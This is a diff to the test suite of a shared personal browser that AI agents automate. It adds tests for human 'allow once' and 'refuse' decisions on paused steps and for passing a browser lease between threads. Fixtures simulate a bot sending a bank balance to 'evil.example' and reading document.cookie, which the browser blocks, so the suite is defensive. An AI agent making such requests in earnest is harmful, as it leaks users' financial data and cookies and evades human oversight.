@@ -872,6 +872,9 @@ describe("PersonalBrowser", () => {
         password: "password-value",
       });
 
+      // One bot at a time on the shared browser: hand the lease on, the
+      // signed-in tab stays open.
+      yield* browser.releaseLease(threadId);
       // Another thread opens the same site and reads it: it inherits the
       // session, which is the point of sharing the saved login.
       yield* browser.handleAutomationRequest(
@@ -885,6 +888,7 @@ describe("PersonalBrowser", () => {
         .handleAutomationRequest(otherRequest("evaluate", { expression: "document.cookie" }))
         .pipe(Effect.asVoid, Effect.flip);
       expect(scripted.message).toContain("Page scripts are disabled");
+      yield* browser.releaseLease(otherThread);
 
       // The tab the password went into is still closed, to its own thread too.
       const onForm = yield* browser
@@ -3670,9 +3674,9 @@ describe("PersonalBrowser", () => {
 
         yield* browser.takeControl("session-1");
         yield* browser.returnToAgent("session-1");
-        expect(harness.resumes.at(-1)?.note).toContain("approved");
+        expect(harness.resumes.at(-1)?.note).toContain("allowed this step once");
 
-        // Approved: that destination now runs unattended...
+        // Allowed once: that destination runs this time...
         yield* browser.handleAutomationRequest(exfil);
         // ...and only that one.
         const elsewhere = yield* refused(
@@ -3680,6 +3684,67 @@ describe("PersonalBrowser", () => {
           request("navigate", { url: "https://other.example/" }),
         );
         expect(elsewhere.message).toContain("request_browser_help");
+      }).pipe(Effect.provide(makeLayer(fake.driver, harness)));
+    });
+
+    it.effect("Allow once lets one retry through, then the same step asks again", () => {
+      const fake = makeFakeDriver();
+      const harness: TaskHarness = { waits: [], resumes: [] };
+      return Effect.gen(function* () {
+        yield* markSensitive(BANK);
+        const browser = yield* PersonalBrowser.PersonalBrowser;
+        yield* browser.handleAutomationRequest(request("navigate", { url: `${BANK}/accounts` }));
+        const exfil = request("navigate", { url: "https://evil.example/?q=balance" });
+        yield* refused(browser, exfil);
+        yield* askHelp(browser);
+
+        const status = yield* browser.approveEgress({
+          threadId,
+          sessionId: "session-1",
+        });
+        expect(status.egressPause).toBeNull();
+        expect(status.helpRequest).toBeNull();
+        expect(harness.resumes.at(-1)?.note).toContain("allowed this step once");
+
+        // One retry passes...
+        yield* browser.handleAutomationRequest(exfil);
+        // ...the next identical step pauses again.
+        expect((yield* refused(browser, exfil)).message).toContain("request_browser_help");
+      }).pipe(Effect.provide(makeLayer(fake.driver, harness)));
+    });
+
+    it.effect("Refuse skips that step, resumes the bot and never closes the browser", () => {
+      const fake = makeFakeDriver();
+      const harness: TaskHarness = { waits: [], resumes: [] };
+      return Effect.gen(function* () {
+        yield* markSensitive(BANK);
+        const browser = yield* PersonalBrowser.PersonalBrowser;
+        yield* browser.handleAutomationRequest(request("navigate", { url: `${BANK}/accounts` }));
+        const exfil = request("navigate", { url: "https://evil.example/?q=balance" });
+        yield* refused(browser, exfil);
+        yield* askHelp(browser);
+
+        const status = yield* browser.refuseEgress({
+          threadId,
+          sessionId: "session-1",
+        });
+        expect(status.egressPause).toBeNull();
+        expect(status.helpRequest).toBeNull();
+        expect(status.state).not.toBe("offline");
+        expect(harness.resumes.at(-1)?.note).toContain("refused this step");
+        // A retry in the same turn fails straight away instead of asking again.
+        const retry = yield* refused(browser, exfil);
+        expect(retry.message).toContain("refused this step");
+        // The step did not happen, and the browser is still on the bank page.
+        expect(fake.state.pages.flatMap((page) => page.gotos)).not.toContain(
+          "https://evil.example/?q=balance",
+        );
+        expect(status.page?.url).toContain(BANK);
+        // A second decision has nothing to decide.
+        const again = yield* browser
+          .refuseEgress({ threadId, sessionId: "session-1" })
+          .pipe(Effect.flip);
+        expect(again.message).toContain("no paused step");
       }).pipe(Effect.provide(makeLayer(fake.driver, harness)));
     });
 
@@ -3748,12 +3813,19 @@ describe("PersonalBrowser", () => {
         yield* markSensitive(BANK);
         const browser = yield* PersonalBrowser.PersonalBrowser;
         yield* browser.handleAutomationRequest(request("navigate", { url: `${BANK}/accounts` }));
+        // The shared browser takes one bot at a time: hand it on before
+        // another chat's operation, or it would (correctly) wait in line.
+        yield* browser.releaseLease(threadId);
 
         const held = yield* refused(
           browser,
           as(child, request("navigate", { url: "https://evil.example/" })),
         );
         expect(held.message).toContain("request_browser_help");
+        // The refusal still took its turn on the shared browser; hand the
+        // lease on before the unrelated chat's own turn.
+        yield* browser.releaseLease(child);
+        yield* browser.releaseLease(threadId);
         yield* browser.handleAutomationRequest(
           as(unrelated, request("navigate", { url: "https://evil.example/" })),
         );
@@ -4235,6 +4307,7 @@ describe("PersonalBrowser", () => {
         );
         expect(sibling).toBeDefined();
         expect(unrelated).toBeDefined();
+        yield* browser.releaseLease(otherThread);
 
         yield* signIn(browser, "https://app.example.com");
 
@@ -4741,10 +4814,12 @@ describe("PersonalBrowser", () => {
         yield* browser.handleAutomationRequest(
           request("navigate", { url: "https://one.example/" }),
         );
+        yield* browser.releaseLease(threadId);
         const theirs = (yield* browser.handleAutomationRequest({
           ...request("open", { url: "https://theirs.example/", reuseExistingTab: false }),
           threadId: other,
         } as PreviewAutomationRequest)) as PreviewAutomationStatus;
+        yield* browser.releaseLease(other);
 
         // The current tab is never closed by default.
         const implicit = yield* refused(browser, request("closeTab", {}));
